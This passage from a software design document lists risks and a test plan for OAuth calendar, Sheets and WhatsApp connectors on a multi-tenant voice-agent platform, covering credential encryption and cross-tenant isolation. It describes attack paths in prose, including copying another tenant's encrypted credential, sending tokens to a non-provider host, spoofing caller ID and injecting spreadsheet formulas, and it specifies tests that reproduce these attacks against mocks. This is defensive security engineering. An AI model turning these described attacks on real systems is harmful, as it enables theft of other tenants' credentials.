  At or above `session_send_cap` it raises `_StepFailure("unavailable", "send_cap_reached")`. An empty `request.session_id` fails closed with the same error, because an uncountable session is an uncapped one.
- **Why `unavailable` and not `invalid_argument`:** `invalid_argument` maps to `ToolStatus.INVALID_ARGUMENT` and tells the model to retry with different arguments (`api_exec_executor.py:27-34`), which is precisely the attack — a new recipient and a new `arguments_hash`. `unavailable` ends the attempt.
- **Why 3:** a legitimate flow sends one confirmation. Three leaves room for one re-send after a corrected template argument plus one platform retry, and bounds a hostile caller's spend on one session at three messages — all three now addressed to that caller's own number, so there is no third-party spam value left, only cost. It is a constant in `presets.py` on the preset definitions, written into the row at apply time; there is no per-tenant config knob.
- **What the caller hears:** the step fails, `api_exec_executor` maps `unavailable` to its existing failure status, and the model tells the caller it could not send another message. Nothing in the message names the cap.
- **Residual:** two chains racing inside one `session_id` could each read the same count and exceed the cap by one. A session's turns are serialized through one orchestrator, so this needs a platform retry overlapping a live turn. The cap bounds spend; it is not a correctness invariant, and the count-then-act window is accepted here for that reason (lesson 8 applies to shared-row state, and this row is not mutated by the check).

**Sheets row:** `sheets_capture_lead` does a `POST` to `…/values/Sheet1!A1:append?valueInputOption=RAW`, with caller values at `values.0.0` through `values.0.3`. `RAW` makes Sheets store every value as typed text, so a caller-supplied `=`, `+`, `-` or `@` prefix is never evaluated as a formula (round-3 finding 3). `valueInputOption` is a literal query param on the preset row. The header row appended at apply time uses `RAW` too.

## Risks
- **OQ1 assumption (manual platform OAuth-app registration, env-configured, no admin screen).** Mitigation: `docs/setup.md` runbook; unconfigured providers are hidden rather than broken; overturning it later means adding a platform-admin screen that writes the same two values.
- **OQ2 assumption (preset rows read-only; changing one means remove and re-apply).** Mitigation: the token-to-host binding in `apply()` is independent of the lock, so overturning OQ2 (making rows editable) opens no token-exfiltration path. Only the "stays preset-shaped" guarantee is lost.
- **Google OAuth app verification.** The calendar scopes are "sensitive", and Google's verification can take weeks before non-test users can consent. Mitigation: Sheets uses only the non-sensitive `drive.file` scope. Start verification at the time of OQ1's registration, and use the 100-test-user cap until it clears.
- **AC17 narrowed: Sheets writes only to a Yuviz-created sheet.** Choosing an existing sheet would need the restricted `spreadsheets` scope and a security assessment. Mitigation: the created sheet is in the tenant's own Drive and fully usable by them. Picker support is a follow-up.
- **AC13 deviation (five rows; reschedule and cancel chain off `gcal_find_booking`, book is not chained off check-slots).** Mitigation: chaining follows real data flow; state it at design review for sign-off.
- **AC23 deviation.** Google ignores idempotency headers, so the key goes into the event `id` through `idempotency_body_field`. It is derived from (tenant, api, arguments), not from the call id. This is deliberate: the platform side-effect claim is already keyed on (tenant, api, arguments) with no call component (`schema.sql` `api_side_effect_claims UNIQUE (tenant_id, custom_api_id, arguments_hash)`). Adding the call id to the event `id` alone would not let a second call book the same patient, service and slot, because the claim refuses it first. It would only weaken upstream dedupe for a platform retry that arrives under a new call id. An identical re-booking inside the claim TTL is treated as a duplicate while the original booking stands. Once that booking is cancelled through `gcal_cancel`, its claim is deleted (Interfaces, "Booking-claim release"), so a same-day rebook of the identical slot succeeds. Mitigation: the event `id` is the claim row's `id`, which `DO UPDATE` preserves, so a retry after the claim TTL expires still gets Google's 409 "duplicate" and surfaces as a failed step rather than a double booking. A cancel made outside Yuviz (directly in Google Calendar) releases nothing, and that rebook is refused until the TTL, as before.
- **AC22 gate proves structure, not intent.** The executor guarantees three things: a verbatim read-back of the exact arguments, a caller turn in between, and an identical re-call. It cannot guarantee that the caller's reply was "yes"; the model judges that. Mitigation: the read-back is deterministic and ends the turn, so a misheard slot surfaces to the caller before anything is written. Any change of detail forces a new read-back, and the existing booking-confirmation prompt and fabrication backstop (`pipeline.py:154-186`) still apply on top.
- **The gate depends on `turn_id` being fresh per caller turn.** Mitigation: it is `uuid4()` per turn (`orchestrator.py:100`), and a test pins that two turns produce different ids. If the conversation ever reused a turn id across turns, the gate would fail closed (it would never match), not open.
- **Widening the `api_chain_runs`/`api_chain_steps` status CHECKs and the response Literals.** Mitigation: only a new value is added; existing readers map unknown statuses to `FAILED` (`api_exec_executor.py:86`), and the one consumer that must understand it is updated in the same change.
- **Folding path values into `resolved_arguments` changes the hash for every existing custom API with a path param.** The `arguments_hash`, the `idem` key and the `confirmation_required` pending-row match all change. A claim taken before the deploy will not dedupe an identical retry after it, and in principle a retry straddling the deploy could be dispatched twice. Mitigation: no existing row has a `confirmation_template`, so no pending confirmation can be orphaned. The exposure is limited to a side-effecting path-param call retried across the deploy instant, and only for a provider that does not dedupe on the idempotency header; the release notes call it out. Rows with no path params produce a byte-identical hash, and test 8 pins that.
- **Path values now reach `api_chain_steps.arguments_redacted`** (readable tenant-wide via `GET /calls/{session_id}/chain-runs`), a new sink for existing path-param APIs (lesson 33). Mitigation: the bare-name key keeps `sensitive` path params redacted by the existing `redaction.redact(…, sensitive_param_names)`, and a test asserts it. A non-sensitive path value was already sent upstream in the URL.
- **A tenant could release a claim it does not own by forging `event_id`.** Mitigation: the release carries `c.tenant_id = $1 AND b.tenant_id = $1`; a guessed foreign claim id matches zero rows, and the claim id is a random UUID that only ever appears in the tenant's own calendar. Test case 7 runs this cross-tenant and must go red with the predicate deleted (lesson 12).
- **Rebook is now possible within one session, which could re-use an old read-back.** Mitigation: the gate's `NOT EXISTS` clause retires a pending row once a booking succeeds after it, so the rebook gets a fresh read-back.
- **The WhatsApp confirmation can now only reach the party on the call (round-4 finding 3).** A tenant whose intended flow was "text my back-office when a booking lands" loses that with this preset. Mitigation: that is a notification, not a caller confirmation, and it is served by a hand-registered `custom_apis` row with a literal recipient, which this change does not touch. The preset's purpose, stated in the PRD, is confirming to the caller.
- **The send cap is a flat constant with no per-tenant override.** Mitigation: deliberate — a tenant-settable cap is a tenant-settable spend limit on an abuse control, and the recipient binding already removes the third-party-spam value, leaving only the tenant's own cost. If a real flow needs more than three, raise the constant in `presets.py` and say so in the PRD.
- **The shared-grant check is this design's only deliberately cross-tenant query (round-4 finding 4).** Mitigation: it is an `EXISTS` on `(provider, provider_sub, status, tenant_id <> $3)` that returns one boolean and never a row, its `provider_sub` comes from the disconnecting row itself and never from a request field (lesson 31), it runs on `platform_conn` so the RLS bypass is explicit and visible rather than incidental, and the boolean never reaches the response (see Interfaces, "`disconnect`"), only a log line with the connection id. A test asserts tenant B's connection row is never read back into any response body.
- **Storing `provider_sub` adds a provider-account identifier to our database.** Mitigation: it is an opaque provider-issued subject, not an email or a name; no route returns it (`list_connections` has an explicit column list); and it is strictly less identifying than `account_label`, which the design already stores and displays.
- **A connection made before this change has a NULL `provider_sub`, so its disconnect still revokes a shared grant.** Mitigation: the fail-closed direction for a *revoke* is to revoke, so the pre-existing behaviour is preserved rather than silently weakened, and the next reconnect in either tenant fills `provider_sub` in. The CRM feature that extends this design will connect every agency account after this deploy.
- **Two callers booking the same slot.** Nothing re-checks free/busy at book time. Mitigation: out of this PRD's ACs; noted for the follow-up scheduler PRD.
- **Microsoft has no refresh-token revoke endpoint.** Disconnect clears our copy only. Mitigation: the fixed Disconnect message tells the admin to also remove Yuviz in their Microsoft account. Google revoke failures (provider unreachable) are handled the same way.
- **Zoho is multi-data-centre.** A tenant on `.in` has a different token host. Mitigation: `accounts_server` is checked against a fixed allowlist and stored per connection. The Zoho app must be registered with multi-DC enabled (runbook).
- **`body_path` and the form JSON-encoding rule change `_resolve_arguments`, which every custom API uses.** Mitigation: `body_path` is NULL on every existing row, so their placement is unchanged. The form rule only affects non-scalar form values, which today are sent as a Python `repr` and are already broken. The executor tests pin the existing flat behaviour.
- **Moving `PinnedResolverTransport` into `custom_apis.py`.** Mitigation: `executor` re-imports it under the same name, and `_step_transport` stays in `executor`, so the existing monkeypatch seam is untouched.
- **The function-local `from . import oauth` in `auth_schemes.apply()`.** Mitigation: it breaks the `custom_apis → auth_schemes → oauth → custom_apis` import cycle. A test calls `apply()` on an `oauth2_authorization_code` row in a fresh interpreter to prove the import resolves.
- **New env vars (`TOOLEXEC_OAUTH_*`).** Justification: OQ1 puts the platform OAuth app outside the DB, and a redirect URI taken from config rather than the request is what AC5 requires.
- **The authorization code briefly sits in the console URL.** Mitigation: it is single-use and PKCE-bound, `history.replaceState` strips it on load, and the callback page sets `<meta name="referrer" content="no-referrer">`.
- **Revocation lag on connector routes (lesson 27, corrected).** `get_current_user` re-reads the `users` row through a 60s per-user memo, then applies `CONSOLE_ROLES` to the row's current role (`services/config/deps.py:90-104, 280-325`). A soft-deleted or demoted admin therefore loses authorize, callback, disconnect, apply and remove within about 60s, not at token expiry. Mitigation: inside that ≤60s window, the state is still bound to `user_id` and expires after 10 minutes, and it grants nothing beyond what the same admin could already do through `custom_apis` in the same window.
- **Legacy `enc:` custom-API credentials stop working at deploy until the script runs.** Mitigation: they fail closed with `credential_unavailable` and are never decrypted. The runbook does a `--dry-run` for counts and then runs the script immediately after the rollout. `convalidated = true` confirms the cutover is complete.
- **Quarantine breaks an integration whose ciphertext was shared across tenants or copied from platform config.** Mitigation: these are exactly the rows the finding describes. Each one gets an audit row, the panel shows the field as empty and required, and the admin re-enters the key as `auth_secrets`. Legitimate Fernet ciphertexts never collide across tenants, so a single-tenant integration is never quarantined.
- **The script cannot detect an attacker's copy whose original was later rotated or deleted** (the copy is the only occurrence left). That copy is rebound to the attacker's tenant. Mitigation: it was already decryptable by that tenant before this deploy, so rebinding gives the attacker nothing new and stops the ciphertext from moving again. The release notes tell tenants to rotate any custom-API key that cross-tenant members could see before this change.
- **Shared-library change: `decrypt_secret` now refuses `enc:t1.`.** Mitigation: no existing ref has that prefix. The four services' resolvers only gain a refusal, and a test pins that legacy Fernet round-trips are unchanged.
- **Same-class residual outside this feature (lesson 37), narrowed.** Config's three credential tables still hold Fernet ciphertext that is not bound to a tenant, and they decrypt it through the unbound resolver. Mitigation: no browser principal can read a Config `enc:` value any more, and no client can store one that its row did not already hold (Interfaces, "Config credential tables"). New cross-tenant copies are therefore impossible. Toolexec refuses every legacy ref and Config refuses every `enc:t1.` ref, so the attacker-host path through a `bearer` custom API stays closed in both directions. The move to `encrypt_tenant_secret` in Config remains the tracked follow-up.
- **Quarantining Config rows takes a working integration offline, including the original owner's.** Round-4 finding 1: a pre-deploy copy keeps working unless the script acts, so the script now quarantines every occurrence of a shared ciphertext in all four Config tables, the original holder included. Mitigation: only ciphertexts that occur under two or more tenants are touched, and Fernet's random IV makes every one of those a copy, so a single-tenant credential is never hit; each occurrence gets an audit row on its own tenant and a line in the `--report` file, so the operator can tell each tenant exactly which credential to rotate; and the whole run is one transaction, so a partial quarantine is impossible.
- **Quarantine is deliberately indiscriminate, because ownership is unknowable here.** The script does not try to name the original holder of a shared ciphertext. Mitigation/justification: no column in this database dates a credential's arrival in a row (`created_at` dates the row, `updated_at` moves for unrelated edits) and the audit log has always redacted `api_key_ref`/`auth_token_ref` (`audit.py:27-33`), so any "oldest wins" heuristic would silently leave a live cross-tenant credential behind whenever it guessed wrong — which is the finding. The cost of being indiscriminate is one extra rotation for a tenant whose credential was already compromised by the copy existing.
- **The script's reach now depends on a column list.** Two of the four security rounds on this feature were a missed ref table (`provider_configs`/`telephony_configs` in R3, `carriers` in R4). Mitigation: `_CONFIG_REF_COLUMNS` is the single declaration both the scan and the writes iterate, and a test asserts its length and membership against an `information_schema.columns` query, so a fifth ref column fails the suite rather than being silently skipped (lessons 29, 42).
- **`--report` writes row and tenant ids to a file.** Mitigation: it holds no ciphertext, plaintext or field value; it is `0600`; it is written only after the transaction commits; and it is read by the platform operator, who already runs the script under the superuser DSN and can read every id in the database anyway. stdout stays counts-only so CI logs gain nothing.
- **`carriers` joins the masked tables, so the DID service must still read the real ref.** Mitigation: `provider_manager` resolves `auth_token_ref` from a row it reads through the DID service's own platform service account (`is_service_account AND tenant_id IS NULL`), which `ref_mask_required` exempts — the identical exemption the other three tables already rely on, and the route-walking masking test runs one case as that account so an over-broad mask goes red.
- **`carriers` gains a plaintext `auth_token` input, which is a new way to put a secret in a request body.** Justification: refusing client `enc:` on a table whose only credential input *was* a ref would otherwise make BYOC carriers unconfigurable by a tenant. Mitigation: it is `SecretStr`, it follows the same seal-on-write path as `provider_configs.api_key`, and `audit._redact` already strips `auth_token_ref`; the audit redaction list gains `auth_token` so the plaintext cannot reach `audit_log` either.
- **Masking breaks a Config consumer that is neither a browser nor a platform service account.** Mitigation: the only readers that need sealed values are Conversation, Telephony and vobiz, and all three authenticate as `is_service_account` with a NULL tenant (lesson 24). The masking test runs one case as such an account and asserts the sealed value is still returned, so an over-broad mask goes red too.
- **Moving `resolve_api_key_input` after the `FOR UPDATE` fetch in two update functions.** Mitigation: it is still in the same transaction and before the `UPDATE`, so the unknown-field and no-fields checks keep their order relative to the write. The existing `test_provider_secret_input.py` cases pin the typed-key, pointer and pasted-raw-key paths.
- **Pointer schemes become platform-only, which is a behaviour change for tenant admins (round-4 finding 5).** A tenant admin who types `env:SOMETHING` into a credential field now gets 400 and must paste the plaintext key instead. Mitigation: reads are untouched, so no live row breaks; the gate is `is_platform_scoped`, the scoping predicate rather than the role (lesson 24), so platform operators and the platform service accounts keep the pointer form; `carriers`' documented `env:PLIVO_AUTH_TOKEN` convention (`carriers.py:8-10`) stays available to the operator who owns that env var, and the tenant gets a plaintext `auth_token` field instead; and `docs/setup.md` states the new rule.
- **ACCEPTED RESIDUAL (round-4 finding 5): Config rows that already hold a tenant-written `env:`/`k8s:` pointer keep resolving.** The fix is write-side only; the script quarantines pointer refs in `custom_apis.auth_config` but leaves Config's alone. Reasoning: on Config these tables, `env:` is the *documented operator* convention and the great majority of live pointer rows were put there by the platform operator, not by a tenant — the database records no principal for a ref, so the script cannot tell the two apart, and quarantining them all would take down carrier and provider configuration platform-wide at the moment of a security deploy. The residual is that a tenant admin who set a pointer *before* this deploy keeps running that tenant on the platform's account. **Today every `env:` name and every `k8s:` path is platform-global**, so what they get is a credential the platform already pays for, not another tenant's data. **What would make this unacceptable:** the moment per-tenant environment variables or per-tenant k8s secret paths exist, the same pointer becomes a cross-tenant *read* of another tenant's secret, and at that point the existing rows must be swept too — the sweep is the same `_CONFIG_REF_COLUMNS` walk, with `env:`/`k8s:` added to the quarantine classes. Ship that sweep with the first per-tenant secret, not after it.
- **Masking `env:`/`k8s:` pointers hides the pointer name in the edit form.** Mitigation: `"[stored]"` keeps it, and typing a new pointer replaces it. The masking is uniform on purpose, because finding 1 asks for every `*_ref` value.
- **No usable remote party means no calendar writes or lookups.** This covers browser test calls, withheld caller ID, a missing or unknown direction, and an outbound call with no callee number. Mitigation: it fails closed with `caller_id_unavailable` and zero upstream requests. Test 10 and the 10-minute QA use a real phone call.
- **A call path that stamps the wrong direction.** `CallRoute` and `InboundRoute` default to `"inbound"`. A future outbound path that forgets to set direction would present the campaign DID as the ANI. Mitigation: `_remote_party` rejects any number that is one of the tenant's own `phone_numbers.did`, whatever the direction. Test 14 includes an outbound leg mislabelled `inbound` that must fail closed. An outbound leg dialled from a number that is not in `phone_numbers` and is also mislabelled is not caught. Today the only outbound path sets `direction="outbound"` explicitly (`orchestrator.py:202`).
- **Outbound bookings are keyed to the callee's number.** A callee who forwards the call, or who is reached on a shared line, gets bookings keyed to the dialled number. Mitigation: that is the number the tenant chose to call, and it is the same trust level as inbound ANI. Anyone who answers that line could already act as that patient for the tenant.
- **Caller ID can be spoofed on some trunks.** Mitigation: the network-asserted ANI is the strongest identity the platform has. A spoofer now needs the victim's exact number, and can reach only Yuviz-created bookings stamped with it. The free-text, any-event attack is closed, and the read-back names the appointment before anything is written.
- **The read-back's date, time and service are not in `arguments_hash`.** The event could be edited in Google between the two turns. Mitigation: `event_id` is hashed, so the exact event that was read back is the one acted on. Turn 2 re-runs `gcal_find_booking`, and a different matched event changes `event_id`, and with it the hash, which forces a new read-back.
- **New `custom_api_params` column `value_prefix` and source value `caller_id`.** Justification: the find-booking query value has to be the literal `yuviz_phone=` joined with a server-side value, and no existing source can express that. Both are preset-only, because `CustomApiParamSpec` does not expose them.
- **Providers whose docs show query-string secrets (Zoho refresh/revoke, Google revoke) must accept the form body.** Mitigation: if a provider rejects it, the call fails closed and is never retried with a query string. Test 10 verifies the live endpoints.
- **Conversation's `policy_resolver` now reads `oauth_connections`.** Mitigation: an explicit `oc.tenant_id = ca.tenant_id` join predicate plus RLS. A test proves another tenant's `connected` row does not re-enable this tenant's API.
- **`oauth.disconnect` contract changed in T16: it takes a `BackgroundTasks` argument and returns the constant `{"disconnected": true}`.** The shared-grant probe and the upstream revoke now run in a post-response callback, so neither the body nor the latency depends on whether another tenant holds the same grant (lesson 2). Consequences: the Interfaces text above that describes a `{"revoked": ...}` field is superseded, and the console cannot know whether the upstream revoke happened. Mitigation: the Disconnect UI message is fixed and tells the admin to also remove Yuviz in the provider account. The route handler passes FastAPI's `BackgroundTasks` through, so any other caller of `oauth.disconnect` must supply one or the revoke never runs.

## Test plan
Integration tests run against real Postgres under the superuser DSN, the only DB role anyone actually runs (lesson 36). Provider HTTP goes through the `_provider_transport` and `_step_transport` MockTransport seams.

1. **Tenant isolation (AC9, AC10).**
   - Seed a connected Google connection for tenant A and one for tenant B.
   - (a) `access_token_for(B_tenant, A_connection_id)` raises `ReconnectRequired`. Then delete the `tenant_id = $1` predicate in a scratch run and the test must go red (lesson 12), so the assertion is proven able to fail.
   - (b) Tenant B's admin running `DELETE /tenants/B/oauth-connections/{A_id}` gets a 404 byte-identical to `DELETE /tenants/B/oauth-connections/{random_uuid}` from the **same** principal (per-caller invariance, lesson 2), and A's row is unchanged when read back from the DB.
   - (c) Inserting a `custom_apis` row for B that references A's connection fails on the composite FK.
   - (d) With A disconnected and B connected, `policy_resolver` for A's agent omits A's calendar APIs.
2. **State and PKCE (AC1, AC3, AC4, AC5).**
   - Callbacks with a forged state, a replayed state (second use of a valid one), an expired state, a state issued to another admin in the same tenant, and a state issued under tenant A but posted to `/tenants/B/...` each return `400 oauth_connection_failed`.
   - For each, the mock token endpoint recorded **zero** requests; assert the recorded-request count, not the absence of an error.
   - A mock that returns `invalid_grant` for a wrong verifier leaves zero `oauth_connections` rows.
   - The authorize URL carries `code_challenge_method=S256` and `redirect_uri == TOOLEXEC_OAUTH_REDIRECT_URI`, and the request model rejects any extra field.
   - Read back from the DB, the stored `code_verifier_ref`, `access_token_ref` and `refresh_token_ref` start with `enc:t1.`. `decrypt_tenant_secret(B, ref)` raises `SecretTenantMismatch` for each of them.
3. **Refresh race and rotation (AC6, AC7, AC10).**
   - Two concurrent `access_token_for` calls on one expired, Microsoft-style connection whose mock rotates the refresh token on each call: exactly one UPDATE returns a row, both callers get a valid token, and the stored access and refresh refs come from the same exchange.
   - An `invalid_grant` delivered to the loser after the winner has rotated does **not** flip the status.
   - A real `invalid_grant` flips it to `reconnect_needed`, and the chain step reports `status="unavailable", error="reconnect_required"`.
4. **Disconnect and reconnect lifecycle (AC8, AC18, AC19).**
   - Apply the calendar preset, then disconnect. The revoke mock was called with the old refresh token in its form body, with an empty query, both refs are NULL in the DB, and the next `gcal_book` execution makes **no** request to `googleapis.com`.
   - Reconnect: the connection id is unchanged, re-applying the preset returns the same 5 row ids, there are no duplicate names, and `gcal_book` executes again.
   - Remove-preset with a hand-made dependent row gives 409.
5. **Token never reaches a sink (AC11, finding 3).**
   - Start with `caplog.set_level(logging.INFO)` and `caplog.set_level(logging.INFO, logger="httpx")`. Use sentinels for the access token, refresh token, `client_secret`, `code` and `code_verifier`.
   - First prove the values really flowed (lesson 12):
     - The upstream mock received `Authorization: Bearer <sentinel>`.
     - The token and revoke mocks received each sentinel in the form body.
     - Each recorded request's `url.query == b""`.
   - Then assert that no sentinel appears in any caplog record's `getMessage()`, `audit_log`, `api_chain_steps.arguments_redacted`, `response_redacted`, `arguments_hash` or any connector API response body, across callback, refresh, execute and disconnect. With `httpx` at INFO, httpx logs every request URL, so an implementation that puts any secret in the query string goes red.
   - **Logger setting.** Call `services.toolexec.__main__.configure_logging()`, with caplog at INFO on the root and with no httpx override. Run a confirmed `gcal_cancel` whose `event_id` is a sentinel. Assert there are zero records from the `httpx`/`httpcore` loggers and the sentinel is absent from caplog. Without the WARNING lines, httpx's `HTTP Request: DELETE …/events/<sentinel>` makes this red. Restore the logger levels in teardown.
   - Host binding: an `oauth2_authorization_code` row whose endpoint is on a non-provider host gets `credential_unavailable`, and the mock for that host recorded zero requests.
6. **Presets (AC13, AC20, AC21, AC23, AC26, OQ2).**
   - The freebusy transform over busy blocks returns at most 3 slots inside working hours in the configured timezone, with the correct `spoken_slots` text.
   - Applying a preset whose endpoint resolves to a denied address (mocked `_resolve_addresses`) creates no rows.
   - A Sheets create failure leaves no rows.
   - `gcal_book`'s outbound body has `id` equal to the hex of its `api_side_effect_claims.id` (read back from the DB), and an identical retry is deduped by the platform claim with no second upstream request.
   - PATCH on any preset row gives `400 preset_managed`.
   - `CustomApiCreate` with `auth_scheme="oauth2_authorization_code"` gives 422.
7. **Confirmation gate (AC22).**
   - First `gcal_book` call: `chain_status="confirmation_required"`, `deterministic_response` equals the rendered read-back (with ISO time spoken), and the Google mock recorded **zero** requests.
   - Identical arguments with the same `turn_id`: still `confirmation_required`, still zero requests.
   - Identical arguments with a new `turn_id`: exactly one request, carrying the read-back's `start.dateTime`.
   - A changed `start_time` on the second turn: a new read-back and zero requests.
   - A pending row older than 10 minutes: re-prompts.
   - Pending row for tenant A's session, same hash, re-called as tenant B: no match (predicate test, deleted-predicate mutation must go red, lesson 12).
   - `api_exec_executor` (unit, mocked `execute_chain`) given `{"chain_status": "confirmation_required", "error": "confirmation_required", "deterministic_response": "<read-back>", "missing_fields": ["x"]}` returns `status is ToolStatus.INVALID_ARGUMENT`, `payload == {"awaiting_caller_confirmation": True}` (exact equality, so a stray `missing_fields` key fails it), `error == "confirmation_required"` and `deterministic_response == "<read-back>"`. The `missing_fields` in the input proves the branch order: an implementation that only adds a `_STATUS_MAP` entry yields `{"missing_fields": ["x"]}` and goes red. The orchestrator then speaks the read-back and ends the turn.
   - **Cancel, then rebook the same slot (integration).** Book slot S (two turns, Google mock 200), cancel it (two turns, find-booking returns the booked event's `id`, delete mock 204). The `gcal_book` claim row is gone from the DB. A third, identical `gcal_book` in the same session gets a fresh read-back, then on the next turn makes exactly one request whose body `id` differs from the first booking's, and the step is `success`.
   - **Failed cancel releases nothing.** Same setup with the delete mock returning 404, and again with a timeout: the `gcal_book` claim row is still present with `status='success'`, and an identical rebook returns `side_effecting_step_already_completed` with zero upstream requests.
   - **Cross-tenant cancel does not release.** Tenant A books (claim row C). Tenant B, with its own applied calendar preset, cancels with `event_id = C.hex` (delete mock 204). A's claim row C is unchanged in the DB, and A's identical rebook is still refused. Delete the `tenant_id = $1` predicates in a scratch run and the test must go red (lesson 12).
   - **Two cancels for different events both go through (integration).** Book slots S1 and S2 (events E1 and E2), then cancel E1 and E2 in the same session, each through its own two-turn confirmation. The two `gcal_cancel` steps have different `arguments_hash` values (read back from `api_chain_steps`), and their `arguments_redacted` contain `event_id` E1 and E2 respectively. The delete mock recorded exactly two requests, to `…/events/E1` and `…/events/E2`. Both steps are `success`, and neither returns `side_effecting_step_already_completed`.
   - **A release error still reports the cancel as successful.** Book and then cancel with the delete mock returning 204, with `_release_booking_claim`'s query monkeypatched to raise. The cancel step is `status='success'` in the response and in `api_chain_steps`, the run is `success`, `caplog` has `booking_claim_release_failed` without the event id, and the `gcal_book` claim row is still present (so the rebook falls back to refusal until the TTL).
   - A `sensitive` path param on a hand-registered side-effecting API shows as `[redacted]` in `arguments_redacted`, and its value still changes `arguments_hash`.
   - A non-gated row (`gcal_check_slots`, any hand-registered API) never runs the lookup, which is asserted by a query counter.
8. **Existing behaviour pinned.** An existing `api_key` row with flat body params and no `body_path` produces a byte-identical outbound body before and after the change, and, having no path params, an unchanged `arguments_hash`. The schema apply run twice **against a DB seeded with live `custom_apis` rows** keeps every constraint present, confirmed by querying `pg_constraint`.
9. **Roles (AC25).** A `viewer` or `supervisor` token on the authorize, callback, disconnect, apply and remove routes gets 403. The guard is awaited, which an AST check confirms (lesson 38).
10. **UI (run the app, lesson 23).** In a browser, run a Google test account through Connect, Apply, Attach, a test call from a real phone (the agent speaks the read-back, the caller says yes, and the event appears on the next turn), a cancel from the same phone (the read-back names the service and time), Disconnect and Reconnect. Check that CustomApisPanel shows the "Disabled — reconnect" and "Managed by preset" badges and shows a stored credential as hidden with Replace, and that saving an unrelated edit keeps the credential working. Check that the callback URL is stripped after load. Against the live providers, confirm that Google revoke and Zoho token, refresh and revoke accept the form-body encoding.
11. **10-minute goal, measurable (review finding 2), QA-stage acceptance.**
    - Setup: a first-time tester with a logged-in tenant admin, one existing agent and a Google account, following only on-screen text.
    - They must reach a real event created by a live test call within **10 minutes wall-clock**.
    - The path must take **≤ 10 console clicks**, excluding Google's own consent screen: Connect, consent, Apply calendar preset, confirm the prefilled form, and 4 attach toggles.
    - They must fill **zero required free-text fields**.
    - Any failure of these three measures is a QA defect against this PRD.
12. **Tenant-bound ciphertext and response masking (finding 1).**
   - Unit:
     - `encrypt_tenant_secret(A, x)` opens for `A`, given as both a `str` and an asyncpg UUID.
     - Opening it for `B` raises `SecretTenantMismatch`, and so does a flipped ciphertext byte.
     - `decrypt_secret` on an `enc:t1.` ref raises, and a legacy Fernet round-trip is unchanged.
     - Mutation check: replace the associated data with a constant in a scratch run, and the B case must go red.
   - The finding's attack, as an integration test:
     - Apply the WhatsApp preset in tenant A. A viewer in A calls `GET /tenants/A/custom-apis`. Walk the whole JSON body and assert that no string starts with `enc:`, `env:` or `k8s:`, and that `key_ref == "[stored]"`.
     - Read A's real `key_ref` from the DB. As B's admin, create a `bearer` API with `token_ref` set to it. That returns 400 `credential_ref_outside_tenant_namespace`.
     - Insert the same row directly into the DB for B and execute it through B's agent. The step reports `credential_unavailable`, and the attacker-host mock recorded zero requests.
   - A legacy Fernet ref is rejected the same way at write time (400). Inserted directly, it fails at call time with zero upstream requests.
   - Creating with `auth_secrets` stores an `enc:t1.` ref that opens for that tenant, read back from the DB. A PATCH that sends `"[stored]"` leaves the stored string byte-identical. `"[stored]"` sent with a changed `auth_scheme`, or on create, gives 400.
   - Masking tripwire: enumerate every route in `routers/custom_apis.py` and `routers/connector_presets.py` whose response carries a custom-API dict, and assert the enumerated count, so that adding a route breaks the test (lesson 12). Call each route and assert there are no ref-shaped strings.
13. **Re-encryption script (finding 1, existing rows).** This runs against a DB seeded with live legacy rows, because an empty DB cannot trip anything (lessons 10, 12). The seed:
   - A unique legacy ref in tenant A, on a live row and on a soft-deleted row.
   - One ciphertext present in both an A row and a B row.
   - A ciphertext also present in a platform `provider_configs` row.
   - A legacy ref that does not decrypt.
   - A ciphertext present in tenant A's `telephony_configs.credentials.auth_token` and copied into a tenant-B `custom_apis` row. It is the only `custom_apis` occurrence.
   - The same for tenant A's `tool_provider_configs.api_key_ref`.
   - **Round-4 finding 1:** a ciphertext present in A's `telephony_configs.credentials.auth_token` **and** in B's `telephony_configs.credentials.auth_token`, with **no** `custom_apis` occurrence at all — the copy the round-3 script would have counted and walked past.
   - **Round-4 finding 2:** a ciphertext present in A's `carriers.auth_token_ref` and in B's `carriers.auth_token_ref`; and a second one present in A's `carriers.auth_token_ref` and copied into a B `custom_apis` row as its only `custom_apis` occurrence.
   - **Round-4 finding 5:** a `custom_apis` row holding `auth_config.key_ref = "env:OPENAI_API_KEY"`, and a Config row holding an `env:` pointer that must be left alone.
   - A single-tenant Config ciphertext in A that appears nowhere else, which must survive byte-identical.

   The cases:
   - Before the script, `custom_apis_auth_config_enc_bound` has `convalidated = false`, and inserting a new legacy ref fails on it.
   - After the script:
     - The unique refs are `enc:t1.`, open for A only and decrypt to the original plaintext.
     - The shared, platform-copied and undecryptable refs are `"quarantined"` in every occurrence, each with an audit row.
     - The B rows holding A's telephony and tool-provider ciphertext are `"quarantined"`, not rebound. Remove those two tables from the inventory in a scratch run and both must go red, showing as rebound to B (lesson 12).
     - **Every shared Config ciphertext is `"quarantined"` in every occurrence, in A's row as well as B's** — the telephony pair, both carrier cases, and the `custom_apis` copies. Each has an audit row on its own tenant with `reason="credential_quarantined_shared_ciphertext"`, and a `--report` line naming table, column, row id and tenant id. The B rows holding A's telephony and tool-provider ciphertext are `"quarantined"`, not rebound; remove those tables from `_CONFIG_REF_COLUMNS` in a scratch run and both must go red, showing as rebound to B (lesson 12).
     - **`config_shared == 0` and the exit code is 0.** Re-run `reencrypt` on the round-3 behaviour (quarantine Config writes disabled) in a scratch run: `config_shared` is non-zero and the exit code is 1, so the gate cannot pass vacuously (lesson 12).
     - **The quarantined Config values fail closed at the readers, not just in the table.** `services/telephony/accounts.py` on the quarantined `telephony_configs` row raises rather than returning an `Account`, and `services/did/provider_manager.get()` on the quarantined carrier raises instead of passing `None` through — the latter must go red if the script writes NULL instead of `"quarantined"`.
     - The single-tenant Config ciphertext is byte-identical to its pre-run state, and the Config `env:` pointer is untouched.
     - The `custom_apis` `env:` pointer is `"quarantined"` with `reason="credential_quarantined_pointer_ref"`, and `quarantined_pointer_refs == 1`.
     - `convalidated = true`, and the exit code is 0.
   - A second run changes nothing and exits 0. Re-applying `schema.sql` leaves `convalidated = true`.
   - With the rebind UPDATE monkeypatched to skip one row, VALIDATE fails, every row **in all five columns** is byte-identical to its pre-run state (so the Config quarantines roll back too), no `--report` file exists, and the exit code is 1.
   - **Inventory tripwire (lessons 29, 42).** `_CONFIG_REF_COLUMNS` is asserted equal — as a set, and by length — to the result of an `information_schema.columns` query over the tenant-scoped Config tables for `TEXT` columns matching `%_ref` plus the `credentials` jsonb. Adding a sixth ref column to `schema.sql` without adding it here must fail this test. Assert the computed set, not a hand-written literal.
